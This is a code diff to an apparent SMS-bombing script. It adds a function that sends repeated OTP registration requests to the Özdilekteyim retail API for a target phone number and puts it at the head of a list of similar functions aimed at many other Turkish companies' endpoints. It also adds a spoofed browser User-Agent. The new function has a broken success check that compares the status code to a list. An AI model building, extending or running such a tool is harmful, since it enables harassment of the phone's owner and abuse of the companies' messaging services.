@@ -2,7 +2,6 @@ import json
 import os
 import sys
 import token
-
 import requests
 import time
 from bs4 import BeautifulSoup
@@ -253,8 +252,9 @@ def englishhome(numara):
         "XID": ""
     }
     headers = {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json',
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
@@ -501,12 +501,29 @@ def komagene(numara, token=None):
     else:
         print(Fore.RED + "[-] Komagene Başarısız!")
 
+import requests
+
+def ozdilekteyim(numara):
+    base_url = "https://api.ozdilekteyim.com/rest/v2/magaza-magaza-store/sms/anonymous/sendotp"
+    params = {
+        "phoneNumber": numara,
+        "eventType": "register",
+        "emailAddress": "sms@yopmail.com",
+        "lang": "tr",
+        "curr": "TRY"
+    }
+    headers = {
+        "Accept": "application/json",
+        "User-Agent": "Mozilla/5.0"
+    }
+    response = requests.post(base_url, params=params, headers=headers)
+    if response.status_code == [200,201]:
+        print(Fore.GREEN + "[+] Özdilekteyim Başarılı!")
+    else:
+        print(Fore.RED + "[-] Özdilekteyim Başarısız!")
 
 
-
-
-
-main = [komagene, totalenergies,Bim , houseofsuperstep, mudo, sportive, damattween, occasion, evidia, kahvedunyasi, dominosgiris, kimgbister, bitlo, koton, tıklagelsin, englishhome, naos,sok]
+main = [ozdilekteyim, komagene, totalenergies,Bim , houseofsuperstep, mudo, sportive, damattween, occasion, evidia, kahvedunyasi, dominosgiris, kimgbister, bitlo, koton, tıklagelsin, englishhome, naos,sok]
 os.system("cls" if os.name == "nt" else "clear")
 for line in flx:
     print(Fore.RED + line)
